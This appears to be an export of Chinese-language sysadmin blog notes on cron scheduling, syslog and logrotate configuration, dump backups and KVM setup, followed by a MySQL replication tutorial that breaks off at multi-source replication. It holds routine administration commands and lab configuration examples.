记录在这个文件中的任务，如果因为电脑关机而没有按时执行 会在系统重新启动后再次执行。 该文件的配置语法可参照 man anacrontab /etc/cron.d/ 是一个目录，里面通常存放用来设定除了以上每天/每周/每月之外的定时任务， 比如说每小时周期执行的任务，和其它任何定时任务。 在这个目录中通常存放系统级别的定时任务 对于具体到某个用户的任务，一般不要放到这里。 /etc/crontab 该文件的作用相当于/etc/cron.d/下面的某一个文件 /var/spool/cron/ 这个目录用来存放各个用户自己设定的定时任务 普通用户没有权限直接访问，必须通过crontab 命令(setuid) crontab -e 系统级别 用户级别 设定定时任务的策略 1. 如果任务的时间只精确到 天/周/月，而且希望在系统重启之后，能把漏掉的任务补回来，则可以把任务的脚本文件放到/etc/cron.{daily,weekly,monthly,hourly} 中，cron会根据/etc/anacrontab 的配置去这三个目录中查找任务的脚本文件。 2. 如果任务的时间精确到分钟，则把任务的脚本文件放到/etc/cron.d/ 中。 3. 用户级别的任务没有选择的余地，只能用crontab命令来设置，设置结果会被放到/var/spool/cron/中。 4. 如果任务的时间需要精确到 秒，则cron没有办法做得到，需要借助其他方法，比如说cron加上自定义的脚本。 ===&gt; 设定系统级别的定时任务 方法： 1. 如果任务需要每天/周/月重复执行，而且希望在系统重启之后，能把漏掉的任务补回来，则为任务创建一个标准的shell脚本，赋予可执行权限，然后把它放到/etc/cron.{daily,weekly,monthly} 三者中相应的那个里面。 2. 如果任务需要每小时重复执行，可以使用系统已经设置好的一个每小时定时任务框架，仿照第1点的操作方式，把脚本文件放到/etc/cron.hourly/ 下面 3. 如果任务需每分钟重复执行，或者需要对时间做更细致的控制（比如：10月10号09点30分），则按下面步骤操作： 3.1. 在目录/etc/cron.d/ 中创建一个文件（可以直接复制该目录下原有的文件，再修改） 3.2. 在创建的文件中输入定时任务的条目，一个文件中可以写多个任务，一个任务一行，格式如下： crontab周期时间配置 # m h dom mon dow command 一行为一条周期任务 每一行以空格为分隔符分隔六个字段 第一字段 分钟 0-59 第二字段 小时 0-23 第三字段 日 具体看月份 (1-31) 第四字段 月 1-12 第五字段 周 0-7 (0和7都代表星期天) 第六字段 周期要执行的命令 时间格式 * 代表每分钟， 每小时，每天， 每月，每周 , 代表分隔时间 3,5,8-10 - 代表时间段 3-10 */n 代表每隔n个单位 解决没有使用vi打开crontab问题: export EDITOR=vi 日与周的关系 两个其中有一个为数字，则以此数字为准 两个都为数字为或的关系 两个都为*, 代表每天 /etc/cron.d/中的文件的范例：(PPP2) SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root HOME=/ * * * * * root echo &quot;Good morning $(date)&quot; &gt;&gt; /tmp/root.log */2 * * * * soul id &gt;&gt; /tmp/soul.log */2 * * * * soul echo &quot;hello $(date)&quot; &gt;&gt; /tmp/soul.log # 每隔两分钟执行 8,10,11,13-16，*/20 * * * * echo &quot;nihao &quot; &gt;&gt; /root/nihao.sh # 每小时 8分，10分，11分。13到16分执行 还有每小时隔20分执行 SEHLL 环境变量指定定时任务执行解析器 PATH 环境变量指定定时任务PATH路径 上面的范例中定义了3个定时任务： 1. 每分钟用root的身份运行命令echo &quot;Good morning $(date)&quot; &gt;&gt; /tmp/root.log 2. 能被2整除的分钟才用soul的身份运行命令 id &gt;&gt; /tmp/soul.log 3. 能被2整除的分钟才用soul的身份运行命令 任务描述中，时间的表示方法有以下的几种（拿分钟那一栏来举例，其它的都相同）： 1. 指定一个具体的数字，比如 3 代表第3分钟，10:03, 11:03, 09:03 都符合 2. 指定一个范围，比如 5-10 代表第5至第10分钟，10:05, 10:06, 11:06, 09:10 都符合 3. 指定一个表达式，比如 */3 代表分钟数能被3整除时才符合，10:00, 10:03, 11:06, 09:27 都符合 4. 结合以上三种，用逗号分隔，比如 3-5,7,15,*/20 10:04, 10:07, 10:15, 10:20, 10:40 都符合 每年的7月6号5点3分或星期天的5点3分执行 3 5 6 7 0 /tmp/test/test.sh 每分钟执行 * * * * * /tmp/test/test.sh 每隔两分钟执行 */2 * * * * /tmp/test/test.sh 每个小时的前30分钟执行任务 0-29 * * * * 每个月的15号每三个小时 每两分钟执行任务 */2 */3 15 * * 每个月的15号每三个小时 每两分钟执行任务 或者 星期三每三个小时 每两分钟执行任务 */2 */3 15 * 3 每天的1 3 7 8 13 21点05分执行任务 5 1,3,7-8,13,21 * * * 每个月的5号和20号的4点到13点的15分执行 15 4-13 5,20 * * 每个星期三的每两个小时 0 */2 * * 3 每年的5到8月的星期三和星期天的4点5分执行 5 4 * 5-8 7,3 设定用户级别的定时任务 格式： 特别注意，用户级别的任务定义当中，没有用户名那一栏，如果像定义系统级别的命令那样，输入用户名，crontab编辑器不会提示格式错误，但是任务不会得到正确的执行。 .---------------- 分钟 (0 - 59) | .------------- 小时 (0 - 23) | | .---------- 一个月中的某一天 (1 - 31) | | | .------- 月份 (1 - 12) | | | | .---- 一周中的某一天 (0 - 6) (0和7都表示周日) | | | | | * * * * * command to be executed 普通用户编辑自己的定时任务 crontab -e​ 编辑当前用户自己的定时任务（使用环境变量EDITOR指定的默认编辑器） crontab -l &lt;--- 列出当前用户自己所有的定时任务 crontab -r &lt;--- 删除当前用户自己所有的定时任务 作为管理员，root可以设定/调整所有用户的定时任务，命令和上面类似，只是增加了一个-u &lt;username&gt; 的参数 crontab -e -u soul &lt;--- 编辑指定用户的定时任务（使用环境变量EDITOR指定的默认编辑器） crontab -l -u soul &lt;--- 列出指定用户所有的定时任务 crontab -r -u soul &lt;--- 删除指定用户所有的定时任务 run-parts cron用这个工具来执行某个目录下所有的可执行脚本，定时任务中的每小时/每天/每周/每月任务就是通过这个工具来触发的。使用方法可以参照cron的配置文件/etc/anacrontab，很简单，命令后面加一个目录名字就可以了，记得目录中的脚本必须可执行。 三. 系统日志系统日志能记录什么信息 系统日志用来记录系统上的各种活动的信息，包括用户登入登出，系统开机关机，客户端访问web，ftp，端口扫描，等等。这些日志可供管理员分析，以帮助排查系统故障，或者发现潜在的问题，等等。常见的几个日志文件： /var/log/secure &lt;-- ssh, ftp, telnet, pop3, pam等有关 /var/log/dmesg &lt;-- 开机时核心检测过程中所产生的信息 /var/log/cron &lt;-- 和定时任务有关的日志 /var/log/wtmp &lt;-- 记录用户登录信息，二进制日志，需要用last查看 /var/log/btmp &lt;-- 记录失败的用户登录信息，二进制日志，需要用lastb查看 /var/log/lastlog &lt;-- 记录用户最后一次登录的信息，二进制日志，需要用lastlog查看 /var/log/boot.log &lt;-- 开机过程的日志，也包含某些服务的启动日志 /var/log/maillog &lt;-- mail相关 /var/log/acpid &lt;-- 高级电源管理 /var/log/yum.log &lt;-- yum的日志 /var/log/messages &lt;-- 非常重要的日志文件，几乎所有的系统重要错误都会记录在这里 Linux上的日志系统是一个系统服务，其他进程把日志信息发给日志服务，日志服务根据进程发来的数据的特征（服务名，级别）结合日志系统自身的配置，把信息写入相应的文件中，或者做其它的处理。 日志系统提供的服务名称，和日志信息的级别 日志系统提供了以下服务(facility) 可供使用 auth authpriv &lt;-- 和权限，登录相关的信息 cron &lt;-- 定时任务会使用这个 daemon kern &lt;-- 内核信息，用户进程无法使用这个服务 lpr mail &lt;-- 邮件系统会使用这个 mark news syslog user uucp local0 到 local7 日志信息分为以下级别，从上到下级别依次降低 none &lt;-- none 不算是一个等级，它表示不记录服务的所有信息 emerg &lt;-- 系统不可用 alert &lt;-- 需要马上处理 crit &lt;-- 非常严重的状况 err &lt;-- 出错 warning &lt;-- 警告 notice &lt;-- 普通但很重要的信息 info &lt;-- 普通信息 debug &lt;-- 调试信息 配置文件中常见的表示符号 . &lt;-- 用来分隔服务和级别 * &lt;-- 任何服务，或者任何级别 = &lt;-- 有等号表示等于某一级别，没有等号表示大于或者等于某一级别 ! &lt;-- 排除操作，前面有相同服务的表达式，这个操作才有意义 代表从前面表达式所包含的内容中排除某些内容 ; &lt;-- 用于分隔不同的 服务.级别 组合 , &lt;-- 用于分隔不同的服务 - &lt;-- 用于指定目标文件时，代表同步写入 举例： cron.* &lt;-- cron 服务的所有级别 *.info &lt;-- 所有服务的info 及以上级别 cron.info &lt;-- . 用于连接服务和级别，表示大于或等于info级别 cron.info;cron.!err &lt;-- 分号隔开多个表达式，感叹号代表取反，结合起来代表大于或等于info，小于err cron.=info &lt;-- 点后面的等号，代表等于info级别 cron.info;cron.!=err &lt;-- 两个表达式结合，代表大于或等于info，但不等于err *.warning;mail.info &lt;-- 任何服务大于等于warning级别，和mail服务大于等于info级别 mail,cron.info &lt;-- mail服务大于等于info级别，和cron服务大于等于info级别 cron.err /var/log/cron.log &lt;-- 文件名前面没有减号，表示异步写入 mail.err -/var/log/mail.log &lt;-- 文件名前面有减号，表示同步写入，也就是说rsyslog不会马上把收到的数据写入文件 日志服务器的配置文件： /etc/rsyslog.conf 配置文件语法举例分析 *.=crit;kern.none /var/adm/critical 把除了kern服务之外的所有服务中级别为crit的信息存入/var/adm/critical kern.* /var/adm/kernel 把kern服务的所有信息存入/var/adm/kernel kern.crit @@10.1.1.1:514 把kern服务crit及以上的信息发送到远程日志服务器10.1.1.1 的TCP 514端口 kern.info;kern.!err /var/adm/kernel-info 把kern服务从info到warning的信息写入/var/adm/kernel-info mail.=info /dev/tty12 把所有指向mail服务的info级别的信息都输出到第12个终端 mail.*;mail.!=info /var/adm/mail 把所有mail服务中，除info级别之外的信息，写入/var/adm/mail mail,news.=info -/var/adm/info 把符合mail.info 和 news.info 的信息存入/var/adm/info，而且要同步写入 *.=emerg * 把所有级别为emerg 的信息发送给所有登录到系统上的用户 *.alert root,czl 把所有级别为alert 的信息发送给在线用户root和czl 日志系统测试工具logger工具可以向syslog发送日志信息，特别适合于调试syslog配置文件，也可以用于需要记录日志的脚本。 使用范例： logger -t &quot;Logger&quot; -p mail.info &quot;Testing log info&quot; logger -t &quot;Cron&quot; -p cron.info &quot;Testing cron info&quot; 四. 日志轮转随着日志的增多，日志文件的尺寸会不断增大，为了方便备份，节省存储空间，可以用工具logrotate 来对各个日志文件做轮转操作。轮转操作本质上是把旧的日志文件改名转存，然后以旧的名字创建一个文件。 用来把旧文件轮转、压缩、删除，并且创建新的日志文件。我们可以根据日志文件的大小、天数等来转存，便于对日志文件管理，一般都是通过cron计划任务来完成的。 man logrotate &lt;-- 搜索CONFIGURATION FILE 可以显示logrotate的范例配置文件，和各种指令的使用说明 logrotate 的配置文件是 /etc/logrotate.conf，配置文件中会引用/etc/logrotate.d/ 下面的其他配置文件。 默认状态文件在/var/lib/logrotate/logrotate.status 实际运行时，Logrotate会调用配置文件/etc/logrotate.conf, 这里定义的是全局属性，而在/etc/logrotate.d目录里，可以定义每项应用服务的配置文件，并且定义会覆盖当下。 定时执行/etc/cron.daily目录下的文件的设置，则在/etc/anacrontab里定义的 常用的指令解释，这些指令都可以在man logrotate 中找得到。 weekly &lt;-- 每周轮转一次(monthly,daily, yearly) rotate 4 &lt;-- 同一个文件最多轮转4次，4次之后就删除该文件 create 0664 root utmp &lt;-- 轮转之后创建新文件，权限是0664，属于root用户和utmp组 dateext &lt;-- 用日期来做轮转之后的文件的后缀名 compress &lt;-- 用gzip对轮转后的日志进行压缩 minsize 30K &lt;-- 文件大于30K，而且周期到了，才会轮转 size 30k &lt;-- 文件必须大于30K才会轮转，而且文件只要大于30K就会轮转 不管周期是否已到 missingok &lt;-- 如果日志文件不存在，不报错 notifempty &lt;-- 如果日志文件是空的，不轮转 sharedscripts &lt;-- 不管有多少个文件待轮转，prerotate 和 postrotate 代码只执行一次 delaycompress &lt;-- 下一次轮转的时候才压缩 prerotate &lt;-- 如果符合轮转的条件 则在轮转之前执行prerotate和endscript 之间的shell代码 postrotate &lt;-- 轮转完后执行postrotate 和 endscript 之间的shell代码 为了避免现有的日志数据被意外覆盖，通常可以给日志文件添加a 属性，这样就只能往文件尾部追加数据，而不能修改已有的数据，也不能删除文件。这只适用于通过添加的方式打开日志文件的程序，比如rsyslog。像wtmp, btmp这个两个文件就不能用这种方法。 添加a属性： sudo chattr +a filename 删除a属性： sudo chattr -a filename 查看隐藏属性 sudo lsattr filename 五. dumpyum install -y dump dump 用于备份整个文件系统，支持完全备份和增量备份，支持ext2/ext3/ext4。用dump创建的备份，可以用工具restore来读取和恢复。 备份级别 dump有个叫做[备份级别]的概念，备份级别分为0级别和大于零的级别，0级别代表完全备份，大于零的级别代表增量备份。级别是确定增量起始点的一个依据，dump工具用它来确定在哪一次备份的基础之上计算增量，举例如下： 日期： 周一 周二 周三 周四 备份的级别： 0 3 2 5 | ? ? ? | ^ ^ ^ | |____|____|____| 假设曾经在周一，周二，周三这三天做过备份，备份的级别分别是0，3，2，那么，如果在周四那天需要做一个级别为5的备份，dump工具是如何确定从哪一次备份的基础上做增量备份的呢？它会按时间从最近的一次备份往前查找（上图中为从周三往周一的方向查找），找一个级别比现在将要执行的备份级别（上图中为级别5）低的备份，按照上图，将会找到周三。 dump 是怎么知道周三曾经做过一个级别为2的备份的呢？靠的是文件/etc/dumpdates，该文件的格式如下： [root dump]# cat /etc/dumpdates /dev/sda1 0 Mon May 12 22:21:04 2014 +0800 &lt;-- 备份的设备，级别（0级别），时间 /dev/sda1 1 Mon May 12 21:52:37 2014 +0800 &lt;-- 备份的设备，级别（1级别），时间 dump的使用下载安装 只能备份整个文件系统，相当于备份一个挂载的设备，硬盘。 sudo yum isntall dump -y dump -0u /mysql -f /data/backup/dump0 -L &quot;Initial dump&quot; 对挂载到/mysql的设备做一个完全备份，备份到文件/data/backup/dump0 中，标签是&quot;Initial dump&quot; dump -1u /mysql -f /data/backup/dump1 对挂载到/mysql的设备做一个1级别的备份，备份到文件/data/backup/dump1 中 restore 的使用列出备份文件/data/backup/dump0 中的内容 [root@mob backup]# restore -t -f /data/backup/dump0 Dump date: Sat Jul 12 21:18:01 2014 Dumped from: the epoch Level 0 dump of /dev/shm/data on mob.lab.net:/dev/loop1 Label: none 2 . &lt;-- 左边是inode 号码，右边是文件名 11 ./0 restore -r -f /data/backup/dump0 把备份文件/data/backup/dump0 中的所有文件恢复到当前目录 restore -i -f /data/backup/dump0 进入互动模式，可以选择性恢复某些文件 验证dump的备份级别对备份结果的影响 1. 创建一系列的备份, 备份级别顺序: 0 3 2 5 4 7 6 1 3 2 5 4 7 6 1 head -c 1m /dev/zero &gt; f0 dump -0u /path/ -f /backup/dump0_l0 -L &quot;Initial dump&quot; ... 2. 查看每个备份文件中的内容 dump存在一个问题，如果在dump在读取某个文件的过程中文件发生了改变，那么dump备份出来的文件可能是损坏的。事实上这是所有备份工具都面临的问题。根据前面所学的lvm的知识，我们可以用dump和lvm的快照逻辑卷相结合，解决dump的这个问题。 1. 首先，在初期部署的时候就必须把需要做备份的数据存放在逻辑卷上。 2. 开始备份前，为将要备份的的逻辑卷创建一个快照逻辑卷 快照逻辑卷的尺寸应能满足在备份过程中/dev/data/mysql的数据增长的需求 如果备份需要30分钟才能完成，而30分钟内/dev/data/mysql将会增长1G，那就给快照分配超过1G的空间。 假设将要备份/dev/data/mysql, 则用下面命令为它创建一个快照 lvcreate -n mysql-snapshot -s /dev/data/mysql -L 300M 3. 备份快照就可以达到备份/dev/data/mysql的目的 dump -0u /dev/data/mysql-snapshot -f /backup/dump0_l0 -L &quot;Initial dump&quot; 4. 备份完成后，要尽快删除快照逻辑卷 lvremove /dev/mapper/mysql-snapshot 六. 安装虚拟机 KVM虚拟机的安装和配置 1. 确认CPU支持虚拟化 grep vmx /proc/cpuinfo &lt;-- Intel CPU grep svm /proc/cpuinfo &lt;-- AMD CPU 2. 确保文件 /dev/kvm 存在，如果没有此文件，需要到电脑的BIOS中开启虚拟化功能 3. 通过yum安装相关软件包 sudo yum install qemu-kvm libvirt virt-install bridge-utils virt-manager libvirt-client -y 4. 启动服务 sudo systemctl start libvirtd.service 5. 应用程序 -&gt; 系统工具 -&gt; 虚拟系统管理器","link":"/2020/08/03/linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"title":"mysql复制技术","text":"mysql复制技术架构讲解:一、mysql AB 复制技术(主从)（异步复制） MySQL支持单向、异步(async)复制，复制过程中一个服务器充当主服务器，而一个或多个其它服务器充当从服务器。 ​ mysql主 - - &gt; mysql从 ​ master slave 把主上的二进制日志(bin-log)的内容传到从上的一个新的日志叫relay-bin-log ​ 从上的 IO 线程 负责传输 ​ 从上的 SQL 线程 负责从服务器解析日志 复制的过程： ​ 1，slave端的IO线程连上master端，请求 ​ 2，master端返回给slave端，bin log文件名和位置信息 ​ 3，IO线程把master端的bin log内容依次写到slave端relay bin log里，并把master端的bin-log文件名和位置记录到master.info里。 ​ 4，salve端的sql线程，检测到relay bin log中内容更新，就会解析relay log里更新的内容，并执行这些操作；也就是说salve执行和master一样的操作而达到数据同步的目的 架构图： 12345678910 客户 ｜ ｜ web程序，游戏程序（c,php,java.......) | |代理层 (mysqlproxy,amoeba) | | mysql主 ----&gt; mysql从 思考回答题： 1，主打开二进制日志，从要不要开二进制日志? 2，主和从的读写情况怎么分开？ 二、一主多从复制构架 架构图 1234567 －－&gt; salvemaster －－&gt; salve －－&gt; salvemaster ——负责写salve ——负责读 适合于以读为主的业务，使用多个salve分担读的压力，但要注意的是这种架构，salve越多，那么master复制的压力就越大 三、双主复制架构 123master A &lt;－－&gt; master B discuz ​ 双主架构最大的优点是，两台服务器实现数据互通，两台即能写又读，在任何一台服务器上写数据，另一台都会同步 思考题： 1、双主mysql复制构架，能同时写相同的数据吗? 2，两边可以写不同的数据吗？ 可以通过业务程序层，指定一些表的写操作全在一端，另一些表的写操作全在另一端，也就是说两边不会同时写相同的表（当然这是理想状态，因为业务复杂的话会有表的联结等情况） 然后通过指定mysql复制的参数，一部分表或库会从A复制到B，另外一部分表或库从B复制到A就可以避免上面的问题了 或者两个库，一个库master A来写，另一个库master B来写 前面三个问题也说明了双主架构的第一种应用（就是两边写不关联的数据，互相复制)，双主架构的第二种应用就是解决一主一从架构里主挂掉了的问题。 看下面的分析 mysql主 mysql从 思考： 问题1:如果一主一从，主挂了，slave能不能写，如果能写，主修好启起来后，salve写的数据如何传回给主? 答案:主挂了，slave应该要写，否则论坛不能发贴，只能看贴； ​ 主修好后（假设一小时)，slave写了这一小时的数据应该要想办法传回主才行。 方法一：DBA人为的把salve这一小时写的数据找出来再导入到主(如果很多表，一小时的操作也非常多，可以说几乎不可能找出这小时改变了啥） 方法二：使用类似rsync的同步方法,这是通过存储层来实现数据同步回去。备：是把整个数据目录复制过去。 方法三：DBA人为的把从这一小时改变的二进制日志（要确认slave打开二进制日志)给找出来然后应用到主上去 方法四：直接把一主一从架构改为双主，或者把一主一从反过改成一从一主 问题2: 上面的方法无论哪一种都会有一个问题，就是把从写的一小时数据传回给主需要一定的时间 就是假设这一小时slave创建了一个aaa表，主mysql修好启动后， 如果主马上接管从的写功能，这时前端程序马上给了一个insert into aaa的插入操作，这样肯定会出问题，因为创建aaa表的操作还没有从slave那传回来,如何解决? 解决方法一:人为控制主现在不能写，等slave的数据传回来后再写；但这样的话，等待时间太长了 解决方法二:就是把一主一从的架构改成双主的架构（假设master A和master B) ​ master A —&gt; master B (平时主B只读，不写，只有到主A挂了，才会写) ​ 挂一个小时 ​ 读写一个小时 ​ 修复后启动了 ​ 把读给A 写留给B 问题3: 改成双主后，master B在master A挂掉的一小时内帮他写了数据，A修好启起来后，B的数据可以自动传回A；但是如果数据量大的话，这个传回也可能需要一定时间，如果正好在这个传回时间内也出现了问题2的情况，又如何解决? 解决方法一:人为控制主不能写，这样的话等待时间很短（因为是自动传回来，跟手动导回来速度快很多)，影响不大 解决方法二: 就直接把master B 做为新的写服务器，master A启动后，也只是做为读服务器；除非等下一次B挂了，A会重新成为写服务器（当然这是在两台服务器性能相等的情况下) 总结: 上面说明双主架构的两种应用 四、级联架构 123456 －－ salve －－ salvemaster －－ salve －－ salve －－ salve －－ salve bin-log bin-log ? 为了解决一主多从的master的复制压力 ​ 可以把slave做为下一级从机的master 加复制的级联层次，造成的延迟更长 所以这种架构并不是很推荐，一般会进行分拆集群 五、双主和级联合起来 12345 master --salve --slave | | －－ slavemaster －－ salve －－ slave －－ slave 优化原则:分 大型结构的数据量太大，要用到数据切分(水平，垂直) mysql 复制技术部署1、关闭iptables,selinux,NetworkManager 2、将主机名和IP写进hosts 3、使用yum rpm包或tar安装数据库，主从两台机安装一致 4、主：开启二进制日志，用于记录对表的增删改操作，并流传给从 5、主从设置server-id值，主的值比从要小 6、主：建立复制的帐号并授权 master A 主服务器ip：192.168.224.10 slave B 从服务器ip： 192.168.224.11 第一步，安装好8.0的Mysql 修改主、从配置文件 /etc/my.conf 主：master:在[mysqld]标签下加入下面二句 123［mysqld] log-bin=mysql-binserver-id=1 备：slave：在[mysqld]标签下加入下面一句 12[mysqld]server-id=2 完成配置后重新启动mysql服务 主服务器上ll /usr/local//mysql/data/看下是否已经有二进制日志,mysql-bin.000001和mysql-bin.index 第二步：建立复制的帐号并授权 先创建用户密码为123.Shui!!@# 1create user 'aa'@'%' identified with mysql_native_password by '123.Shui!!@#'; 然后授予复制权限 1grant super,replication slave on *.* to 'aa'@'%'; 授权完成后，在从服务器上登陆测试 登陆成功后就退出 1mysql -uaa -h192.168.224.10 -p'123.Shui!!@#' 第三步：给master加上锁，防止有新的数据写入 1flush tables with read lock; 查看二进制日志记录的位置，配置从服务器要用,只要服务器开启二进制日志后才允许当主 12show master status; #查看主服务器配置show slave status; #查看从服务器配置 查看master 1show master status; 备注：尝试在主服务器上使用命令show slave status; 查看是否有数据，因这台服务器是主服务器，所以条命令是看不到任何东西，是空的。 1mysql&gt; exit 查看主服务器的日志文件名是否和上面查出来的一致，配置从服务器要用 1ll /usr/local/mysql/data/ 对照文件名是否一致 第四步：在从服务器slave端，配置mysql主从关系 切到从服务器192.168.224.11上面 先登陆数据库 1mysql -p 停止从服务器复制线程：备注：默认该线程就是停止状态，执行该命令是告诉数据库该线程明确的要停止 1stop slave; 配置主从关系： 该台服务器为从时，需要配置连接主服务器的信息，从服务器能不能在主服务器上面获取二进制日志，全靠下面的配置信息。 mysql&gt; change master to #配置从服务器连接主服务器 -&gt; master_user=’aa’, #主服务器建立复制的帐号 -&gt; master_password=’123.Shui!!@#’, #密码 -&gt; master_host=’192.168.224.10’, #主服务器IP -&gt; master_port=3306, #端口，注：不能加引号 -&gt; master_log_file=’mysql-bin.000001’, #主上面查到的文件名 -&gt; master_log_pos=662 #主上面查到的位置号 1change master to master_user='aa',master_password='123.Shui!!@#',master_host='192.168.224.10',master_log_file='mysql-bin.000001',master_log_pos=662; 配置连接主服务器信息后，在从服务器上启动slave线程。 1start slave; 启动完成后，再查看slave线程连接主服务器的状态 1show slave status\\G 12345START SLAVE 启动除group_replication_recovery和 group_replication_applier通道之外的所有通道的复制线程 。STOP SLAVE 停止所有通道（group_replication_recovery和和 group_replication_applier通道除外）的复制线程 。SHOW SLAVE STATUS 报告除group_replication_applier通道之外的所有通道的状态 。RESET SLAVE 重置所有通道。reset slave all; 清除所有信息； 警告 请RESET SLAVE谨慎使用，因为此语句将删除所有现有通道，清除其中继日志文件，并仅重新创建默认通道。 第五步：在主服务器master端解锁mysql： 1234unlock tables;#可以查看连接信息show processlist\\G 第六步：测试 在主服务器上创建库、表和插入表数据后，在从服务器查看是否有相同数据 123create database aa;create table aa.test (id int,name varchar(20));insert into aa.test values(0,&quot;zhangshan&quot;),(1,&quot;wangwu&quot;); 在从服务器上查看 1select * from aa.test; 第七步：查看日志文件： 在从服务器上查看(192.168.224.11) 12345cat /usr/local/mysql/data/server1-relay-bin.index./server1-relay-bin.000001./server1-relay-bin.000002mysqlbinlog /usr/local/mysql/data/server1-relay-bin.000002 题外： ​ 尝试登陆从服务器: 192.168.224.11 1mysql -uroot -p'123.Shui!!' ​ 在从服务器上面登陆库、表并使用insert插入数据。 这时再登陆主服务器:192.168.224.10 1mysql -uroot -p'123.Shui!!' ​ 在主服务器上查看是否有从服务器创建和插入的数据。 备注：只有master写，slave可以看到，slave写，master看不到 如果复制出现问题 （要模拟问题的话，在从上创建一个库，然后在主上也创建这个库，就会冲突，造成复制出现问题）， 重做复制集群只需要重新在从上执行stop slave; change master to …… ; start slave; 测试：把从重启后，再上去查看状态，还是连接的，没什么影响 把主重启后，再去slave上去查看状态，发现重试时间为60秒，等60秒后又自动连接OK了 如果想要改这个60秒的话，可以把从服务器上的master.info文件里的60直接改成30(rpm版测试有点问题) 1主多从的做法 123 -&gt;slavemaster -&gt;slave 就是上面的步骤有几个从就做几次, 双主架构 1master - master 把上面的1主1从，反过来做一遍，在上面的slave机也打开二进制日志，反着做一遍就行，注意做的过程中，保证数据一致 做好的架构，只要两边不同时操作相同的数据，就不会出现复制不一致的问题； 或者是在业务程序层，将一部分的写操作定义到master A,另一部分的写操作定义到master B 级联架构master A 主服务器ip：192.168.224.10 slave B 从服务器ip：192.168.224.11 slave C 从服务器IP：192.168.224.12 master A -slave B -slave C 把中间的从也要打开二进制日志。但是它默认不把应用master的操作记录到自己的二进制日志。所以需要打开一个参数让它记录，才可以传给第三级的从 本文需要验证的疑问： 从库做为其他从库的主库时 log-slave-updates参数是必须要添加的，因为从库要作为其他从库的主库，必须添加该参数。该参数就是为了让从库从主库复制数据时可以写入到binlog日志，为什么要用这个参数写binlog日志呢，不是在配置文件中开启log-bin =mysql-bin选项就可以吗？ 答：从库开启log-bin参数，如果直接往从库写数据，是可以记录log-bin日志的，但是从库通过I0线程读取主库二进制日志文件，然后通过SQL线程写入的数据，是不会记录binlog日志的。也就是说从库从主库上复制的数据，是不写入从库的binlog日志的。所以从库做为其他从库的主库时需要在配置文件中添加log-slave-updates 参数。 在/etc/my.cnf文件里加上以下二句： 12max_allowed_packet=20M #代表应用的日志大小log-slave-updates=1 #代表可以读取上一级从服务器应用主服务器的日志 在服务器里查看参数 12show variables like '%max_allowed%';show variables like '%log_slave%'; 架构图： 1234567 master A slave B slave C 192.168.224.10 192.168.224.11 192.168.224.12 sever-id=1 server-id=2 server-id=3log-bin=mysql-bin log-bin=mysql-bin log-slave-updates=1 log-slave-updates=1 这台不需要加这个参数 日志应用流程： 12345bin-log relay-bin-log relay-bin-log -&gt;master A 创建一个库时日志会写进bin-log(二进制日志) -&gt;这时slave B 去master A读取bin-log再将应用日志放到本地的relay-bin-log日志里 -&gt;slave C 这时去读取slave B的bin-log和relay-bin-log日志(因为slave B添加了允许其它服务器读取我的应用日志log-slave-updates=1) 2主多从+级联 2主就是把前面的双主架构做一遍，多从就是在新服务器上把从服务做一遍，如果要加级联就是再把级联架构做一遍。 Mysql 基于表复制技术复制库、表和表内容参数：可使用show slave status\\G 命令看到以下参数 Replicate_Do_DB: #接受哪个库的复制：必须在指定的库下操作才能复制。包括表结构和表数据。 Replicate_Ignore_DB: #忽略哪个库的复制 Replicate_Do_Table: #接受哪个表的复制：注：只能指定某个库下的某个表的内容更新与修改，例：aaa.a3 Replicate_Ignore_Table: #忽略哪个表的复制 Replicate_Wild_Do_Table: #通配符表示复制哪些表：注：接收某个库下的所有表内容的修改，例:aaa.% Replicate_Wild_Ignore_Table: #通配符表示忽略哪些表 实例说明： ​ master A slave B 1、先把两台做成ab复制的架构 ​ 此时在master上做任何创建库、表或插入数据等动作，从服务器都会复制过来。 2、现在的业务需求是： 要求：把master的aaa库下的表复制到slave上，其它的库都不要 3、为了满足需求我们在slave b的my.cnf配置文件的[mysqld]参数组里加上 1replicate_do_db=aaa #只接受aaa库的复制 4、重启slave b，然后测试 测试结果为 ​ -&gt;在master上创建aaa库:create database aaa; ​ -&gt;在master创建aaa.a1表:create table aaa.a1(id int(1)); ​ -&gt;并插入数据insert into aaa.a1 values(1); ​ -&gt;回到slave上查看有aaa库，也有a1表，但没有数据 ​ 如果要同步aaa.a1表下的数据，master要进到aaa库下操作才可以 ​ -&gt;在master上操作，use aaa;然后再插入数据：insert into aaa.a1 values(2); ​ -&gt;回到slave上查看aaa库的a1表数据，这时就有了 ​ 如果想要复制该库下所有的表数据，这时就要加入另外一个参数 5、解决方法： ​ 在slave b上的my.cnf文件的[mysqld]标签下加上以下参数，就可以复制aaa库下的所有表和表内容了 1replicate_wild_do_table=aaa.% #%是通配符 6、重启slave b 然后测试 测试步骤： ​ -&gt;在master创建aaa.a2表:create table aaa.a2(id int(1)); ​ -&gt;并插入数据insert into aaa.a2 values(1); ​ -&gt;并给aaa.a1表也插入数据：insert into aaa.a1 values(2); ​ -&gt;回到slave上查看aaa库下是否有a2表，a2和a1表是否有上面插入的数据。 表复制技术完成 多源复制注意：mysql多源复制技术仅支持5.7以上版本mysql 官方文档 1https://dev.mysql.com/doc/refman/8.0/en/channels-startup-options.html 1、多源复制的特性 1.1 和主从复制技术一样，都是通过mysql的二进制日志（binlog）来实现数据的同步 2、什么地方需要用到多源复制 2.1 在此之前，我们讲到了mysql主从复制技术，但考虑一下，如果我有两台不同数据的mysql服务器，该如何才能实现同时使用一个slave进行数据同步备份呢？ 提示：在做多源复制之前先把之前搭建好的双主关掉 12stop slave;reset slave all; 参数讲解： 必须正确配置 以下启动设置才能使用多源复制。 relay_log_info_repository。 必须将其设置为TABLE。如果将此变量设置为FILE，则尝试向副本添加更多源失败 ER_SLAVE_NEW_CHANNEL_WRONG_REPOSITORY。FILE现在已弃用该设置，它 TABLE是默认设置。 master_info_repository 必须将其设置为TABLE。如果将此变量设置为FILE，则尝试向副本添加更多源失败 ER_SLAVE_NEW_CHANNEL_WRONG_REPOSITORY。FILE现在已弃用该设置，它 TABLE是默认设置。 skip_slave_start=1 该参数能够让数据库实例在启动的时候禁止建立主从关系，即禁止开启mysql的io线程和sql线程，用于搭建从库的时候需要，防止数据库启动的时候会自动开启了这两个线程，进而导致破坏了从库 因此在mysql的配置文件中的mysqld栏上加上该参数可防止破坏 当启用enforce_gtid_consistency 